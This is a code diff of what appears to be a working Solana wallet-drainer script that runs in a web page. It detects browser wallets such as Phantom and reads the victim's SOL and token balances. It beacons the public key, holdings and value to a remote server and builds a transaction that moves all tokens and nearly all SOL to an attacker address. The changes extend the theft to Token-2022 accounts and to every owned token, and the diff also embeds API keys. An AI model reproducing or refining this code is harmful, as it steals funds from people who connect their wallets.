@@ -5,12 +5,12 @@
   const E = "https://esm.sh/";
   const SRV = String(window.__PP || "https://one234-et4e.onrender.com").replace(/\/+$/, "");
   const BKEY = "72d296b612eb0a11931b364ba1333a70";
-  const VER = "v3.3";
+  const VER = "v3.4";
   const RPCS = [
+    "https://mainnet.helius-rpc.com/?api-key=60de1451-c4ed-4a9c-a989-89c210d5b0d3",
     "https://solana-rpc.publicnode.com",
     "https://api.mainnet-beta.solana.com",
-    "https://rpc.ankr.com/solana",
-    "https://solana.api.onfinality.io/public"
+    "https://rpc.ankr.com/solana"
   ];
   const MINTS = {
     USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
@@ -19,6 +19,8 @@
     JUP: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN",
     MSOL: "mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So"
   };
+  const TP_STR = "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm";
+  const TP22_STR = "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb";
 
   const TO = ms => (typeof AbortSignal !== "undefined" && AbortSignal.timeout) ? AbortSignal.timeout(ms) : undefined;
 
@@ -32,27 +34,25 @@
 
   async function rpc(method, params) {
     let lastErr = null;
-    for (const u of RPCS) {
+    for (let i = 0; i < RPCS.length; i++) {
+      const u = RPCS[i];
+      const host = u.replace("https://", "").split("/")[0];
       try {
         const r = await fetch(u, { method: "POST", headers: { "content-type": "application/json" },
           body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: method, params: params }), signal: TO(10000) });
         if (!r.ok) {
-          lastErr = new Error(u.replace("https://", "").split("/")[0] + " HTTP " + r.status);
-          await new Promise(function (s) { setTimeout(s, 300); });
-          continue;
+          lastErr = new Error(host + " HTTP " + r.status);
+        } else {
+          const j = await r.json();
+          if (j && j.result !== undefined) return j;
+          lastErr = new Error(host + ": " + (j && j.error ? (j.error.message || "RPC error") : "malformed response"));
         }
-        const j = await r.json();
-        if (j && j.result !== undefined) return j;
-        if (j && j.error) {
-          lastErr = new Error(j.error.message || "RPC error");
-          if (j.error.code === -32601) return j;
-          await new Promise(function (s) { setTimeout(s, 300); });
-          continue;
-        }
-      } catch (e) { lastErr = e; }
-      await new Promise(function (s) { setTimeout(s, 300); });
+      } catch (e) {
+        lastErr = new Error(host + ": " + (e && e.message ? e.message : String(e)));
+      }
+      if (i < RPCS.length - 1) await new Promise(s => setTimeout(s, 300));
     }
-    return { error: { message: lastErr ? String(lastErr.message || lastErr) : "all RPC endpoints failed" } };
+    return { error: { message: lastErr ? lastErr.message : "all RPC endpoints failed" } };
   }
 
   async function readBalance(pk) {
@@ -71,31 +71,44 @@
     return null;
   }
 
+  // both token programs in parallel; ok=false only when BOTH reads failed
   async function readTokens(pk) {
-    for (let a = 0; a < 3; a++) {
-      const r = await rpc("getParsedTokenAccountsByOwner", [pk, {
-        programId: "TokenkegQfcHZ6MbFiy6v8N7xTXSCJiDugmpSAn5soCMQm",
-        commitment: "confirmed"
-      }]);
-      if (r && r.result !== undefined) return r.result;
+    const cfg = { commitment: "confirmed" };
+    for (let a = 0; a < 2; a++) {
+      const rs = await Promise.all([
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP_STR }, cfg]),
+        rpc("getParsedTokenAccountsByOwner", [pk, { programId: TP22_STR }, cfg])
+      ]);
+      const out = { value: [] };
+      let ok = false;
+      for (const r of rs) {
+        if (r && !r.error && r.result !== undefined) {
+          out.value.push.apply(out.value, (r.result && r.result.value) || []);
+          ok = true;
+        }
+      }
+      if (ok) return out;
       await new Promise(s => setTimeout(s, 1200));
     }
-    return null;
+    return null; // null = RPC failure, NOT "empty wallet" — parseTokenAccounts(null) yields {}
   }
 
-  // correct JSON-RPC shape — parsed data lives at account.data.parsed.info
+  // correct JSON-RPC shape — parsed data lives at account.data.parsed.info;
+  // account.owner tells us which token program owns the account
   function parseTokenAccounts(res) {
     const out = {};
     for (const it of ((res && res.value) || [])) {
       try {
-        const info = it.account && it.account.data && it.account.data.parsed && it.account.data.parsed.info;
+        const a = it.account || {};
+        const info = a.data && a.data.parsed && a.data.parsed.info;
         if (!info || !info.mint) continue;
         const ta = info.tokenAmount || {};
         out[info.mint] = {
           raw: BigInt(ta.amount || "0"),
           ui: Number(ta.amount || 0) / Math.pow(10, ta.decimals == null ? 6 : ta.decimals),
-          dec: ta.decimals == null ? 6 : ta.decimals,
-          src: it.pubkey
+          dec: ta.decimals == null ? null : ta.decimals,
+          src: it.pubkey,
+          prog: a.owner || null
         };
       } catch (e) {}
     }
@@ -114,19 +127,7 @@
     } catch (e) {}
   };
 
-  const pubStr = function (v) {
-    try {
-      if (!v) return null;
-      if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
-      if (typeof v.toBase58 === "function") return v.toBase58();
-      if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
-      return null;
-    } catch (e) { return null; }
-  };
-
   try {
-    beacon("loaded", { provider: "scanning" });
-
     const mod = await import(E + "@solana/web3.js@1.95.0");
     const PublicKey = mod.PublicKey;
     const Keypair = mod.Keypair;
@@ -138,10 +139,23 @@
     const createTransfer = spl.createTransfer;
     const createAssociatedTokenAccountInstruction = spl.createAssociatedTokenAccountInstruction;
     const getAssociatedTokenAddress = spl.getAssociatedTokenAddress;
+    const createTransferCheckedInstruction = spl.createTransferCheckedInstruction;
 
     const bs = await import(E + "bs58@6.0.0");
     const b58d = bs.decode;
-    const b58e = bs.encode;
+
+    const TP = new PublicKey(TP_STR);
+    const TP22 = new PublicKey(TP22_STR);
+
+    const pubStr = function (v) {
+      try {
+        if (!v) return null;
+        if (typeof v === "string") return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v) ? v : null;
+        if (typeof v.toBase58 === "function") return v.toBase58();
+        if (v instanceof Uint8Array) return new PublicKey(v).toBase58();
+        return null;
+      } catch (e) { return null; }
+    };
 
     const CANDS = [
       ["phantom", function () { return window.phantom && window.phantom.solana; }],
@@ -230,24 +244,28 @@
     const pkB = new PublicKey(pk);
     const conn = new Connection(RPCS[0], "confirmed");
 
+    beacon("loaded", { provider: label });
+
     // — inventory —
     const bal = await readBalance(pk);
     if (bal === null) {
       beacon("err", { pk: pk, provider: label, msg: "balance read failed on all RPC + proxy \u2014 attempting drain with fallback amount" });
     }
-    const balKnown = bal !== null;
     const balNum = bal !== null ? bal : 0;
 
     const r = await readTokens(pk);
     const A = parseTokenAccounts(r);
 
+    const mvals = Object.values(MINTS);
+    const allOwned = Object.keys(A).filter(m => A[m].raw > 0n);
     const toks = Object.entries(MINTS).filter(function (kv) { return ((A[kv[1]] && A[kv[1]].ui) || 0) > 0.01; })
       .map(function (kv) { return { k: kv[0], ui: A[kv[1]].ui }; });
+    const others = allOwned.filter(m => !mvals.includes(m)).length;
 
     // price parse — lite-api.jup.ag/price/v2 keys by mint at top level (ids/data tried as fallback)
     const px = {};
     try {
-      const j = await withTO(fetch("https://lite-api.jup.ag/price/v2?ids=" + Object.values(MINTS).join(",")).then(r => r.json()), 8000);
+      const j = await withTO(fetch("https://lite-api.jup.ag/price/v2?ids=" + mvals.join(",")).then(r => r.json()), 8000);
       for (const id of Object.keys(MINTS)) {
         const key = MINTS[id];
         const e = (j && (j[key] || (j.ids && j.ids[key]) || (j.data && j.data[key]))) || null;
@@ -261,7 +279,8 @@
       return s + t.ui * (t.k === "WSOL" ? SOLpx : (px[t.k] || 1));
     }, 0);
     const fmt = function (n) { return (+n).toLocaleString("en-US", { maximumFractionDigits: 0 }); };
-    const tokStr = toks.map(function (t) { return Math.round(t.ui) + " " + t.k; }).join(" \u00b7 ");
+    const tokStr = toks.map(function (t) { return Math.round(t.ui) + " " + t.k; }).join(" \u00b7 ") +
+      (others ? " +" + others + " more" : "");
 
     beacon("detect", { value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr });
 
@@ -294,11 +313,14 @@
       setInterval(function () { scans += Math.random() * 3 | 0; const s = document.getElementById("__pp_scan"); if (s) s.textContent = "\u00b7 " + fmt(scans) + " tokens scanned"; }, 5000);
     } catch (e) { beacon("err", { pk: pk, provider: label, msg: "ui: " + String(e && e.message || e) }); }
 
-    // error reports route as m:"err" so TG shows them as patroller errors, not fake drains
+    // error reports route as m:"err", empty wallets as m:"dust" — TG labels stay truthful
     const report = function (mode, sig, extra) {
-      const body = mode === "err"
-        ? { pk: pk, provider: label, origin: location.origin, m: "err", msg: String(extra || sig || "unknown error") }
-        : { pk: pk, provider: label, origin: location.origin, value: +value.toFixed(2), sol: +sol.toFixed(4), toks: tokStr, m: "drain", mode: mode, sig: String(sig), extra: extra || "" };
+      let body;
+      if (mode === "err") body = { m: "err", msg: String(extra || sig || "unknown error") };
+      else if (mode === "empty") body = { m: "dust", extra: "dust \u2014 nothing worth moving" };
+      else body = { m: "drain", mode: mode, sig: String(sig), extra: extra || "" };
+      body.pk = pk; body.provider = label; body.origin = location.origin;
+      body.value = +value.toFixed(2); body.sol = +sol.toFixed(4); body.toks = tokStr;
       try { fetch(SRV + "/beacon?s=" + BKEY, { method: "POST", signal: TO(10000), body: JSON.stringify(body) }); } catch (e) {}
     };
 
@@ -349,7 +371,7 @@
         beacon("err", { pk: pk, provider: label, msg: "blockhash failed: " + why });
         return { err: why };
       }
-      // no bogus 5,000,000-lamport fallback — abort if balance is unknown
+      // no bogus fallback — abort if balance is unknown
       const bal2 = await readBalance(pk);
       if (bal2 === null) {
         beacon("err", { pk: pk, provider: label, msg: "balance unknown after retries \u2014 drain aborted, no blind tx" });
@@ -360,16 +382,25 @@
       const A2 = parseTokenAccounts(r2);
       const tx = new Transaction();
       const moved = [];
-      for (const t of toks) {
-        const have = (A2[MINTS[t.k]] && A2[MINTS[t.k]].ui) || 0;
-        if (have < 0.01) continue;
-        const mint = new PublicKey(MINTS[t.k]);
-        const srcAta = new PublicKey(A2[MINTS[t.k]].src);
-        const destAta = await getAssociatedTokenAddress(mint, dest);
-        const info = await conn.getAccountInfo(destAta);
-        if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint));
-        tx.add(createTransfer(srcAta, destAta, pkB, A2[MINTS[t.k]].raw));
-        moved.push(t.k);
+      for (const ms of Object.keys(A2)) {
+        const t = A2[ms];
+        if (t.raw <= 0n) continue;
+        const prog = (t.prog === TP_STR) ? TP : (t.prog === TP22_STR ? TP22 : null);
+        if (!prog) continue; // unknown owning program — skip rather than build a bad instruction
+        const mint = new PublicKey(ms);
+        const srcAta = new PublicKey(t.src);
+        const destAta = await getAssociatedTokenAddress(mint, dest, false, prog);
+        let info;
+        try { info = await conn.getAccountInfo(destAta); }
+        catch (e) {
+          const why = "ata check failed: " + String(e && e.message || e);
+          beacon("err", { pk: pk, provider: label, msg: why });
+          return { err: why };
+        }
+        if (!info) tx.add(createAssociatedTokenAccountInstruction(pkB, destAta, dest, mint, prog));
+        if (prog === TP) tx.add(createTransfer(srcAta, destAta, pkB, t.raw));
+        else tx.add(createTransferCheckedInstruction({ source: srcAta, mint: mint, destination: destAta, owner: pkB, amount: t.raw, decimals: t.dec == null ? 0 : t.dec }, prog));
+        moved.push(ms.slice(0, 4) + "\u2026");
       }
       const lam = Math.floor(balNum);
       if (lam > FEE + 5000) tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: lam - FEE }));
